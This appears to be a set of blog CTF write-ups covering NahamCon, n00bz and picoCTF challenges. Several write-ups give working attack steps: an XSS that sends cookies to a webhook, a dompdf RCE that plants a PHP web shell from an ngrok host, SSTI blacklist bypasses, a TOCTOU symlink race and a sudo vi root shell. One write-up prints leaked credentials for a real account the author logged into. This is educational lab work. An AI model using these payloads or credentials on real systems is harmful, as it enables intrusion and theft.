webhook.site to receive the cookie request.\n1 2 3 \u0026lt;script\u0026gt; document.write(``\u0026#39;\u0026lt;img src=\u0026#34;https://webhook.site/538e246b-2888-428c-b201-75331cefc008?c=\u0026#39;``+document.cookie+``\u0026#39;\u0026#34; /\u0026gt;\u0026#39;``); \u0026lt;/script\u0026gt; This XSS generates an image pointing to my webhook.site link, and adds the user\u0026rsquo;s document.cookie to the end of the url. And so, when a victim views this page, the image will attempt to be loaded by visiting my webhook. The webhook will log the request information and with it, I will be able to see whatever cookies are associated with the victim\u0026rsquo;s session.\nIndeed we see a cookie: x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIvRmQ.20AcIM9F-Kg8q21j8Pc4mVl2aO0\nBy substituting our X-wing cookie for this one, we become admin. Revisiting the page, nothing has changed. After a quick directory enumeration, we can find a new page by visiting /admin. This is pretty guessable, although I do concede to running feroxbuster to point it out to me:\n1 2 3 4 feroxbuster -u http://challenge.nahamcon.com:30413/ \u0026lt;...SNIP...\u0026gt; 02 GET 4l 28w 303c http://challenge.nahamcon.com:30413/admin \u0026lt;...SNIP...\u0026gt; When visiting /admin while having the token, we can find the flag.\nflag{a538c88890d45a382e44dfd00296a99b}\nStickers Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website! Find the flag file in /flag.txt at the root of the filesystem.\nVisiting the website, there is a form to fill out custom information. Upon submitting data, we are generated a pdf webpage:\nIn particular I notice the url of the page corresponds to the data I submitted:\n1 http://challenge.nahamcon.com:31182/quote.php?organisation=\u0026amp;email=\u0026amp;small=0\u0026amp;medium=0\u0026amp;large=0 I downloaded the pdf file and decided to see if I can glean some information on how it was generated:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ exiftool quote.pdf ExifTool Version Number : 12.57 File Name : quote.pdf Directory : . File Size : 2.5 kB File Modification Date/Time : 2023:06:16 15:15:27-04:00 File Access Date/Time : 2023:06:16 15:15:27-04:00 File Inode Change Date/Time : 2023:06:16 15:15:27-04:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.7 Linearized : No Page Count : 1 Producer : dompdf 1.2.0 + CPDF Create Date : 2023:06:16 19:14:20+00:00 Modify Date : 2023:06:16 19:14:20+00:00 Title : Quote Immediately the producer dompdf stands out to me. I recognize a pretty serious vulnerability it that can lead to remote code execution CVE-2022-28368.\nI used this poc post to exploit this.\nUsing my own ngrok website, I direct the payload toward myself, where it can pick up the malicious php:\n1 challenge.nahamcon.com:31182/quote.php?organisation=\u0026lt;link rel=stylesheet href=\u0026#39;https://91cf-50-81-86-237.ngrok-free.app/exploit.css\u0026#39;\u0026gt;\u0026amp;email=\u0026amp;small=0\u0026amp;medium=0\u0026amp;large=0 In the exploit_font.php, I used a simple webshell one-liner:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ cat exploit_font.php � dum1�cmap `�,glyf5sc��head�Q6�6hhea��($hmtxD loca Tmaxp\\ nameD�|8dum2� -��-���� :83#5:08��_\u0026lt;� @�8�\u0026amp;۽ :8L�� :D 6 s \u0026lt;?php if(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){ echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; $cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]); system($cmd); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; die; }?\u0026gt; The unreadable junk above seems to be related to the file being intended as a font style, so it was left unchanged.\nAfter the request is sent, I see two GET requests on my server, knowing that it was successfully retrieved:\n1 2 3 4 5 HTTP Requests ------------- GET /exploit_font.php 200 OK GET /exploit.css 200 OK Now we need to determine the new name of the malicious php downloaded. While not thoroughly explained in the POC github, it appears that the name is based on the md5sum of the download link, in this case my ngrok link:\n1 2 $ echo -ne \u0026#34;https://91cf-50-81-86-237.ngrok-free.app/exploit_font.php\u0026#34; | md5sum 88045a0e7631a2540434bb8c27d7d483 - Now we visit the downloaded link under the format /dompdf/lib/fonts/\u0026lt;font-family\u0026gt;_\u0026lt;style\u0026gt;_\u0026lt;md5(url)\u0026gt;.php\n1 challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=id 1 2 3 � dum1�cmap`�,glyf5sc��head�Q6�6hhea��($hmtxD Lloca Tmaxp\\ nameD�|8dum2� -��-���� :83#5:08��_\u0026lt;�@�8�\u0026amp;۽ :8L�� :D 6 s uid=33(www-data) gid=33(www-data) groups=33(www-data) We do indeed see that it works! We were told the flag is located in root of the filesystem:\n1 challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=cat /flag.txt flag{a4d52beabcfdeb6ba79fc08709bb5508}\n","date":"2023-06-18T20:41:32-05:00","permalink":"https://yuwenmichael.netlify.app/post/nahamconctf_2023/","title":"NahamConCTF_2023"},{"content":"Misc Amazing Song Lyrics This is a wierd png file. I hope you can make some sense out of it!\nNote: Wrap the flag in n00bz{} and flag is all lowercase Author: NoobMaster The image is a pictogram for certain sign languages, but what language? I am no expert in sign language so I begin with random google searching. A brief search for American Sign Language alphabet gives me hand shapes that look similar:\nDecoding the message based on the hand shapes shown in this chart we get the following:\n1 2 3 4 5 AMERIC ANSIGN LANGUA GEDECO DED rephrased: American sign language decoded.\nn00bz{americansignlanguagedecoded}\nGoogle Form 1 Binary Flag Checkers are old, so how about some Google Forms Flag Checker? Link Author: NoobMaster\nVisiting the site we are met with a Google form:\nRandom guesses yield no results. However when we check source code, we can search for the ctf flag format n00bz using find. Within the source code we discover the flag: n00bz{1n5p3ct_3l3m3n7_ftw!}\nMy Chemical Romance My friend loves Chemistry very much specially the elements. Once I asked him the wifi password he gave me some numbers like 186808155710 and told me that the number are in group of two like 1008 -\u0026gt; 10 and 08/8. Can you help to gather the wifi password? (Note: It forms a complete word, so you might have to leave out something).\nFlag format: n00bz{the_password_in_lower_case} Author: noob_abhinav\nBased on the description, this password is likely linked to periodic table elements. We are also told that the password represents a real word, so the element letters might not exactly translate to the answer.\nFrom 186808155710 we can separate into elements: 18 68 08 15 57 10 Using periodic table, element letters are as follows: ar er o p la ne indeed areroplane doesn\u0026rsquo;t work, however this looks similar to the word aeroplane. Trying this as the flag works. n00bz{aeroplane}\nOSINT Mission Moon A mission, had planned to land on the moon. Can you find where it planned to land on the moon and the name of the lander and rover? Flag is latitude longitude upto one decimal place.\nNote: Flag format - n00bz{Lander_Rover_latitude_longitude} for eg - n00bz{Examplelander_Examplerover_12.3_45.6}. Also note that flag is case sensitive! Note: Due to a quite big range of answers, to narrow down your search, use the latitude and longitude provided from this site: blog.jatan.space This presented image appears to be a 3D rendering of a moon landing plan. The first easy check to be done is a reverse image search in google, and see what articles are discussing this event. Very quickly I see an article that uses the image discussing a failed landing for India\u0026rsquo;s moon mission titled Chandrayaan 2. The lander for this mission appears to be called Vikram, and the rover called Pragyan. This info is part of the flag, but we still need to find the exact coordinates of the planned landing. With a mission name in mind, I visited the blog.jatan.space site mentioned, and searched for Chandrayaan 2. On this page I learned the coordinates planned for the landing: 70.9S, 22.8E.\nNow we can construct and submit the flag as n00bz{Vikram_Pragyan_70.9_22.8}.\nTry to hack me My friend brayannoob gave me a ctf challenge and told me Try to hack me.\nA google search on brayannoob did not yield any interesting results, so I decided to switch search engines. Upon using Bing, a github account was among the first results, very interesting. The repositories within this github we see a n00bzCTF-2022 writeup. With relevance on our side, this is clearly related to the challenge. Exploring the newest repository, BrayanResearch, I uncovered user credentials from an older edit of the README.md file:\n1 2 3 4 \u0026lt;!-- ACCOUNT CREDENTIALS --\u0026gt;| \u0026lt;!-- USERNAME - @brayanduarte.noob --\u0026gt;| \u0026lt;!-- PASSWORD - Brayann00b@2023 --\u0026gt; # THANK YOU :love: Other edits also give light to potential usernames:\n1 \u0026lt;!-- username : @brayan24 --\u0026gt; and in the current readme:\n1 \u0026lt;!-- username : brayan234 --\u0026gt; We have potential usernames and a password, but which service these are for? It is not so clear.\nThis github repo supplies a demo, providing a link to replit.com. After searching for a little bit, we come across this user.. Using the provided password, I was able to log in and \u0026ldquo;hack\u0026rdquo; this account! However, after searching for quite some time, I was unable to find the flag. Reviewing the CTF discord channel, there is an announcement that breaching this account was unintended for the challenge. I suppose this little adventure may serve to emphasize how easy it might be to accidentally leak credentials on github or other services!\nFrom the discord message we know the password login is irrelevant, time to think on the hints provided in the prompt again. Looking at the Try to hack me part, it makes me think of the popular web service TryHackMe. After looking through usernames we stumble upon a certain username from our list: brayan234. Looking at this account, it appears we didn\u0026rsquo;t need to log in at all! The flag is presented right in the user info section. n00bz{y0u_p4ss3d_th3_ch4ll3ng3_c0ngr4tul4t10ns_7c48179d2b7547938409152641cf8e}\nWeb Club_N00b Can you get in the club? Author: 0xBlue\nhttp://challs.n00bzunit3d.xyz:8080/\nFollowing the link:\nOnly \u0026ldquo;radical\u0026rdquo; hackers are allowed, and we are not. Upon checking status, we see the button is not post/cookie data related, but instead redirects to an interesting url:\n1 http://challs.n00bzunit3d.xyz:8080/check?secret_phrase=nope We are not on the member list. But perhaps if we change the secret_phrase? After a couple guesses, we successfully get in with secret_phrase=radical.\nn00bz{see_you_in_the_club_acting_real_nice}\nSecret Group To get the flag, you must be a member of the secret group! Author: NoobMaster\nhttp://challs.n00bzunit3d.xyz:31401/\nVisiting the url, we see the following in plain text:\n1 Not an agent of the **n00bz-4dm1n** secure browser! My first thought is that it is asking for a change to the http header User-Agent. Doing so using curl:\n1 2 curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; http://challs.n00bzunit3d.xyz:31401/ \u0026lt;p\u0026gt;Does not Accept \u0026lt;b\u0026gt;fl4g\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; It looks to be another edit to http headers:\n1 2 curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; -H \u0026#34;Accept: fl4g\u0026#34; http://challs.n00bzunit3d.xyz:31401/ \u0026lt;p\u0026gt;Connection not \u0026lt;b\u0026gt;s3cur3\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; Again keeping with the trend, I add another header line for connection:\n1 2 curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; -H \u0026#34;Accept: fl4g\u0026#34; -H \u0026#34;Connection: s3cur3\u0026#34; http://challs.n00bzunit3d.xyz:31401/ \u0026lt;p\u0026gt;Not refered by \u0026lt;b\u0026gt;s3cr3t.n00bz-4dm1n.xyz\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; Time to add referer tag:\n1 2 curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; -H \u0026#34;Accept: fl4g\u0026#34; -H \u0026#34;Connection: s3cur3\u0026#34; -H \u0026#34;Referer: s3cr3t.n00bz-4dm1n.xyz\u0026#34; http://challs.n00bzunit3d.xyz:31401/ \u0026lt;b\u0026gt;Give-Flag\u0026lt;/b\u0026gt; is not \u0026lt;b\u0026gt;7ru3\u0026lt;/b\u0026gt; Give-Flag is not really a common http header, but based on what has been going on, it\u0026rsquo;s the first thing we should try.\n1 2 $ curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; -H \u0026#34;Accept: fl4g\u0026#34; -H \u0026#34;Connection: s3cur3\u0026#34; -H \u0026#34;Referer: s3cr3t.n00bz-4dm1n.xyz\u0026#34; -H \u0026#34;Give-Flag: 7ru3\u0026#34; http://challs.n00bzunit3d.xyz:31401/ n00bz{y0u_4r3_n0w_4_v4l1d_m3mb3r_0f_th3_s3cr3t_gr0up!} Finally we get the flag. n00bz{y0u_4r3_n0w_4_v4l1d_m3mb3r_0f_th3_s3cr3t_gr0up!}\nCaas Curl as a Service is old, welcome to Certificate as a Service! Note: flag is in flag.txt Author: NoobMaster\nI was not able to solve this on my own, but thanks to onsra03 for the fantastic writeup post-CTF.\nSource code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #!/usr/bin/env python3 from flask import Flask, request, render_template, render_template_string, redirect import subprocess import urllib app = Flask(__name__) def blacklist(inp): blacklist = [\u0026#39;mro\u0026#39;,\u0026#39;url\u0026#39;,\u0026#39;join\u0026#39;,\u0026#39;attr\u0026#39;,\u0026#39;dict\u0026#39;,\u0026#39;()\u0026#39;,\u0026#39;init\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;lipsum\u0026#39;,\u0026#39;current_app\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;subclasses\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;ls\u0026#39;,\u0026#39;flag.txt\u0026#39;,\u0026#39;cycler\u0026#39;,\u0026#39;[]\u0026#39;,\u0026#39;0\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;,\u0026#39;3\u0026#39;,\u0026#39;4\u0026#39;,\u0026#39;5\u0026#39;,\u0026#39;6\u0026#39;,\u0026#39;7\u0026#39;,\u0026#39;8\u0026#39;,\u0026#39;9\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;:\u0026#39;,\u0026#39;update\u0026#39;,\u0026#39;config\u0026#39;,\u0026#39;self\u0026#39;,\u0026#39;class\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;#\u0026#39;] for b in blacklist: if b in inp: return \u0026#34;Blacklisted word!\u0026#34; if len(inp) \u0026lt;= 70: return inp if len(inp) \u0026gt; 70: return \u0026#34;Input too long!\u0026#34; @app.route(\u0026#39;/\u0026#39;) def main(): return redirect(\u0026#39;/generate\u0026#39;) @app.route(\u0026#39;/generate\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def generate_certificate(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;generate_certificate.html\u0026#39;) elif request.method == \u0026#39;POST\u0026#39;: name = blacklist(request.values[\u0026#39;name\u0026#39;]) teamname = request.values[\u0026#39;team_name\u0026#39;] return render_template_string(f\u0026#39;\u0026lt;p\u0026gt;Haha! No certificate for {name}\u0026lt;/p\u0026gt;\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=52130) Reviewing the source code, we can get an idea on what kind of exploit is involved just by looking at the type of strings blacklisted. These are common python functions, suggesting a python code injection. Exploring where our input is used, we have this line:\n1 render_template_string(f\u0026#39;\u0026lt;p\u0026gt;Haha! No certificate for {name}\u0026lt;/p\u0026gt;\u0026#39;) A very quick google search suggests this might be SSTI, which is reasonable to believe based on the blacklist. We must utilize SSTI to display the contents of flag.txt. Among the commonly used SSTI functions present within the blacklist, we even see flag.txt is among them.\nBypassing blacklist It is clear that this blacklist must be bypassed. One possible approach is to use quotations to break string sequences. Onsra03 proposes {{namespace['__ini''t__']['__global''s__']['o''s']['pop''en']('l\\s')['rea''d'](+)}}. However, with this we quickly approach the 70 char limit.\nFrom the source code it is worth pointing out that only the parameter name is checked for blacklisted characters. If we can supply blacklisted characters in team_name\u0026ndash; or perhaps an unused parameter\u0026ndash;then call team_name again within name, we should be able to pass the blacklisted characters to execute.\nBuilding payload Using global variable g, we can generate a much smaller payload from namespace[__ini''t__]. Secondly, we can utilize request.form to reference a different supplied parameter containing banned strings. At this point, our payload is small enough that referencing team_name is still within the length requirements. However, we could make the name parameter even smaller by referencing some single letter parameter such as a:\n1 name={{g.pop[\u0026#39;__global\u0026#39;\u0026#39;s__\u0026#39;].__builtins__.eval(request.form.team_name)}}\u0026amp;team_name=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read() Supplying this as the post request body:\n1 2 curl -X POST http://challs.n00bzunit3d.xyz:52130/generate -d \u0026#34;name={{g.pop[\u0026#39;__global\u0026#39;\u0026#39;s__\u0026#39;].__builtins__.eval(request.form.team_name)}}\u0026amp;team_name=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026#34; \u0026lt;p\u0026gt;Haha! No certificate for n00bz{5571_57r1k3s_4g41n_7a1b3f4e5d}\u0026lt;/p\u0026gt; Alternative payload Another interesting approach does not use g.pop but instead utilizes Flask\u0026rsquo;s get_flashed_messages function:\n1 name={{get_flashed_messages[\u0026#39;__built\u0026#39;\u0026#39;ins__\u0026#39;].eval(request.values[\u0026#39;a\u0026#39;])}}\u0026amp;a=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026amp;team_name=b Note that in this situation referencing team_name in request.values will exceed the input length limit, so we utilize a single letter parameter a instead. The values for team_name doesn\u0026rsquo;t matter anymore, so it\u0026rsquo;s just set to b.\n","date":"2023-06-14T20:25:09-05:00","permalink":"https://yuwenmichael.netlify.app/post/n00bzctf_2023/","title":"N00bzCTF_2023"},{"content":"Binary Exploitation tic-tac Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. ssh to saturn.picoctf.net:62983, and run the binary named \u0026ldquo;txtreader\u0026rdquo; once connected. Login as ctf-player with the password, d137d16e\nUpon ssh into machine, we see txtreader binary and flag.txt file, however we don\u0026rsquo;t have permissions to read them. Fortunately, they also give us the pre-compiled code for txtreader so that we might get a better idea on what\u0026rsquo;s going on:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; int main(int argc, char *argv[]) { if (argc != 2) { std::cerr \u0026lt;\u0026lt; \u0026#34;Usage: \u0026#34; \u0026lt;\u0026lt; argv[0] \u0026lt;\u0026lt; \u0026#34; \u0026lt;filename\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } std::string filename = argv[1]; std::ifstream file(filename); struct stat statbuf; // Check the file\u0026#39;s status information. if (stat(filename.c_str(), \u0026amp;statbuf) == -1) { std::cerr \u0026lt;\u0026lt; \u0026#34;Error: Could not retrieve file information\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Check the file\u0026#39;s owner. if (statbuf.st_uid != getuid()) { std::cerr \u0026lt;\u0026lt; \u0026#34;Error: you don\u0026#39;t own this file\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Read the contents of the file. if (file.is_open()) { std::string line; while (getline(file, line)) { std::cout \u0026lt;\u0026lt; line \u0026lt;\u0026lt; std::endl; } } else { std::cerr \u0026lt;\u0026lt; \u0026#34;Error: Could not open file\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } return 0; } Essentially, the file first checks if the file exists, then checks if our permission to view the file. If we are allowed to view, it will read the file contents. It\u0026rsquo;s also worth noting that txtreader has SUID bit set, allowing it to run as root when we use:\n1 2 $ ls -l txtreader -rwsr-xr-x 1 root root 19016 Mar 16 02:28 txtreader If we can send the textreader to open a file we have permissions on, then quickly swap it with a file linked to the flag, we should be able to trick the program into reading the flag contents for us. This is known as a Race Condition, or TOCTOU type of problem. This video by John Hammond covers a similar CTF challenge, and the solution can be done with the same approach. 1. We will create our own file called link with touch, that we can read/write to. 2. We will start txtreader, and tell it to read link, which is owned by us. 3. txtreader will check the file, and confirm we have permission to read the file 4. We will delete link, and create a new link file that is symlinked to flag.txt. Now when things want to interact with link, they are pointed to flag.txt 5. txtreader will attempt to read link, except it now points to flag.txt. Since it already confirmed we have permissions, it will output the contents of flag.txt Since txtreader won\u0026rsquo;t be waiting for us to manipulate the files in between actions, we have to be very fast, hence the race aspect. Our human action speeds aren\u0026rsquo;t nearly good enough, so what we can do is loop the action of swapping link , while also looping the run of txtreader. After enough runs, hopefully our action timings will line up and we can get the flag. Making the link loop, linker.sh:\n1 2 3 4 5 6 7 while true do rm link touch link rm link ln -s /home/ctf-player/flag.txt link done Setting up the linker loop and running txtreader:\n1 2 3 4 5 6 7 8 9 ctf-player@pico-chall$ chmod +x linker.sh ctf-player@pico-chall$ ./linker.sh rm: cannot remove \u0026#39;link\u0026#39;: No such file or directory ^Z [1]+ Stopped ./linker.sh ctf-player@pico-chall$ bg 1 [1]+ ./linker.sh \u0026amp; ctf-player@pico-chall$ while [ 1 ]; do ./txtreader link; done 2\u0026gt;/dev/null picoCTF{ToctoU_!s_3a5y_f482a247} Overall while this method works, it is not very reliable. Sometimes you can get lucky and the flag is read after a few minutes of running, other times it had not succeeded once in the full 15min duration of the instance.\npicoCTF{ToctoU_!s_3a5y_f482a247}\nPotential Solution\u0026ndash;Reliable race fixing? It might be possible to \u0026ldquo;fix\u0026rdquo; the race for us, resulting in very reliable success of flag read. This post describes using a filesystem maze too large for the system to handle in memory at once, allowing for a more clear window of opportunity for us to switch targets. The maze consists of many nested folders, containing symlinks pointing to another batch of nested folders. After repeating for x times, the final link points to the file we own. The maze is too large to be placed in the filesystem cache, and this process results in slower navigation and an increased delay between the action of checking permissions and the action of reading the file contents.\nWhile I did not have time to utilize this trick on tic-tac, it might be worth exploring on another CTF challenge.\ntwo-sum Can you solve this? What two positive numbers can make this possible: n1 \u0026gt; n1 + n2 OR n2 \u0026gt; n1 + n2 Enter them here nc saturn.picoctf.net 56856. Source\nEssentially, we need a result where combining two positive numbers results in a smaller number. Sounds impossible, right? We can achieve this by causing an integer overflow, or inputting two large numbers that will overflow the \u0026ldquo;limit\u0026rdquo; and come back as a lower value result.\n1 2 3 4 5 6 7 $ nc saturn.picoctf.net 56856 n1 \u0026gt; n1 + n2 OR n2\u0026gt; n1 + n2 What two positive numbers can make this possible: 5555555555 5555555555 You have entered 1260588259 and 1260588259 You have an integer overflow YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9} Note that despite entering 5 555 555 555, it shows that we entered number 1 260 588 259. When we provided a number above the acceptable limit the value overflowed, and our result is something much lower. Now when the 1 260 588 259 is added together, it is still lower than our original input 5 555 555 555. Overflow achieved!\npicoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}\nForensics hideme Every file gets a flag. The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye here.\nDownloading the file shows flag.png. Exiftool tells me there\u0026rsquo;s more to this image than first shown:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 exiftool flag.png ExifTool Version Number : 12.57 File Name : flag.png Directory : . File Size : 43 kB File Modification Date/Time : 2023:03:14 17:08:24-04:00 File Access Date/Time : 2023:03:14 17:08:50-04:00 File Inode Change Date/Time : 2023:03:14 17:08:30-04:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 512 Image Height : 504 Bit Depth : 8 Color Type : RGB with Alpha Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Warning : [minor] Trailer data after PNG IEND chunk Image Size : 512x504 Megapixels : 0.258 The warning tells us there is extra data after the image information is done, the PNG IEND chunk. We can verify this ourselves with xxd:\n1 2 3 4 5 6 7 8 9 10 11 xxd flag.png \u0026lt;...snip...\u0026gt; 00009b20: 0448 2004 02ff 0fe1 93e1 23be c327 2900 .H .......#..\u0026#39;). 00009b30: 0000 0049 454e 44ae 4260 8250 4b03 040a ...IEND.B`.PK... 00009b40: 0000 0000 001c 136c 5600 0000 0000 0000 .......lV....... 00009b50: 0000 0000 0007 001c 0073 6563 7265 742f .........secret/ 00009b60: 5554 0900 03f7 370d 64f7 370d 6475 780b UT....7.d.7.dux. 00009b70: 0001 0400 0000 0004 0000 0000 504b 0304 ............PK.. 00009b80: 1400 0000 0800 1c13 6c56 656c 5c74 810b ........lVel\\t.. 00009b90: 0000 1b0c 0000 0f00 1c00 7365 6372 6574 ..........secret \u0026lt;...snip...\u0026gt; Using binwalk, we can see the segmented data:\n1 2 3 4 5 6 7 8 9 $ binwalk ./flag.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced 41 0x29 Zlib compressed data, compressed 39739 0x9B3B Zip archive data, at least v1.0 to extract, name: secret/ 39804 0x9B7C Zip archive data, at least v2.0 to extract, compressed size: 2945, uncompressed size: 3099, name: secret/flag.png 42984 0xA7E8 End of Zip archive, footer length: 22 This can also be separated with binwalk:\n1 $ binwalk -D=\u0026#34;.*\u0026#34; ./flag.png The output file is a folder titled _flag.png.extracted\n1 2 3 4 5 6 7 8 9 $ ls -al total 108 drwxr-xr-x 3 kali kali 4096 Mar 14 17:37 . drwxr-xr-x 3 kali kali 4096 Mar 14 17:28 .. -rw-r--r-- 1 kali kali 43006 Mar 14 17:28 0 -rw-r--r-- 1 kali kali 0 Mar 14 17:28 29 -rw-r--r-- 1 kali kali 42965 Mar 14 17:28 29-0 -rw-r--r-- 1 kali kali 3267 Mar 14 17:28 9B3B -rw-r--r-- 1 kali kali 22 Mar 14 17:28 A7E8 After the bulk of data, 9B3B, it appears to be compressed information:\n1 2 $ file 9B3B 9B3B: Zip archive data, at least v1.0 to extract, compression method=store Rename it as zip file and unzip:\n1 $ mv 9B3B 9B3B.zip \u0026amp;\u0026amp; unzip 9B3B.zip Resulting output is folder secret with yet another flag.png:\n1 2 $ file flag.png flag.png: PNG image data, 600 x 50, 16-bit grayscale, non-interlaced Opening this image shows our flag.\nGeneral Skills chrono How to automate tasks to run at intervals on linux servers? Additional details will be available after launching your challenge instance\nFor this challenge, we are given a hint toward how linux servers might automate tasks.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nLinux systems are able to automate tasks on regular intervals through the usage of cron. More info can be found on the Linux manual page. The customizable settings for cron jobs can be found in a file called crontab, which is always located in the /etc/ directory. We can check for a crontab file using ls:\n1 2 picoplayer@challenge:~$ ls /etc/crontab /etc/crontab Now that we have confirmed it is there, we can output the contents in plaintext using cat:\n1 2 picoplayer@challenge:~$ cat /etc/crontab # picoCTF{Sch3DUL7NG_T45K3_L1NUX_7754e199} money-ware Flag format: picoCTF{Malwarename} The first letter of the malware name should be capitalized and the rest lowercase. Your friend just got hacked and has been asked to pay some bitcoins to 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of?\nIn this challenge, we are given a bitcoin address, and information that this address is used to siphon money from an innocent friend\u0026rsquo;s bitcoin wallet. Since blockchain transactions are publicly disclosed, we can view the activity associated with this wallet on a quick Google search.\nwww.bitcoinabuse.com is a website dedicated to tracking bitcoin addresses used in ransomeware and blackmailings, so if our address was used in other previous attacks, we can find reports for our given address.\nSearching this address we see several reports for multiple abuse types. Since we know our friend had been hacked, the abuse type is likely a ransomeware attack. The first report against this address is labeled ransomeware, and provides a link where we might learn more:\nMore information here: https://blog.avira.com/petya-strikes-back/\nThe title of the article plainly tells us the malware at play is based on the infamous ransomeware Petya, but we can also follow the link to learn more about it.\nWe are told the answer to the flag is the malware involved, so we can submit the flag by inserting \u0026ldquo;Petya\u0026rdquo; into the picoCTF flag format. picoCTF{Petya}\nPermissions Can you read files in the root file?\nAdditional details will be available after launching your challenge instance.\nThis challenge asks us to read a file in the /root directory. Files located here are typically under the highest access protections possible, requiring only root permissions and rejecting any other non-super user.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nFirstly, we can check our own user privileges:\n1 2 picoplayer@challenge:~$ id uid=1000(picoplayer) gid=1000(picoplayer) groups=1000(picoplayer) We can see we are not a part of root in any way, uid gid or part of the root group. It is unlikely we can access /root, so it is unsurprising to see we are denied:\n1 2 picoplayer@challenge:/$ cd /root -bash: cd: /root: Permission denied We need to find a way to elevate our permissions before we can go here.\nA common approach to elevating privileges is to do super-user actions, through the command sudo. Users are often limited in the kinds of sudo actions they can do. We can check what is allowed for our user by typing sudo -l:\n1 2 3 4 5 6 7 picoplayer@challenge:/$ sudo -l Matching Defaults entries for picoplayer on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User picoplayer may run the following commands on challenge: (ALL) /usr/bin/vi Notably, we can run /usr/bin/vi as any user, including root, as noted by the (ALL). vi is a common text editor used to edit files. Since we are interested in reading the contents of a file, opening the file using vi is enough to tell us what\u0026rsquo;s inside.\n1 picoplayer@challenge:/$ sudo vi /root/flag.txt However, when we do this we don\u0026rsquo;t see anything? This is because even though we know the location of the flag, we are still guessing if it is called flag.txt or something else. We need a way to explore the contents of the /root directory.\nWhile vi has the main purpose of being a text editor, we can also abuse some of it\u0026rsquo;s other features to obtain an interactive terminal session as user root:\n1 sudo vi -c \u0026#39;:!/bin/bash\u0026#39; Here, we launch vi with sudo vi. With -c flag, we specify a command :!/bin/bash for vi to run on launch. Alternatively, we can do this ourselves after launching vi. Simply typing :shell will open a shell session as the current user, in this case, root.\nNow we can access /root:\n1 2 root@challenge:~# ls root@challenge:~# Typing ls shows no file in root? The challenge description mentions reading files in root, so surely something must be here:\n1 2 root@challenge:~# ls -a . .. .bashrc .flag.txt .profile By adding -a flag to ls we can see hidden files. There is our flag, under .flag.txt. So, the reason we couldn\u0026rsquo;t find it earlier was because the name was indeed different from what we expected. We can revisit to see that, once the proper name is supplied, vi could have been used to view file contents:\n1 picoplayer@challenge:~$ sudo vi /root/.flag.txt 1 2 3 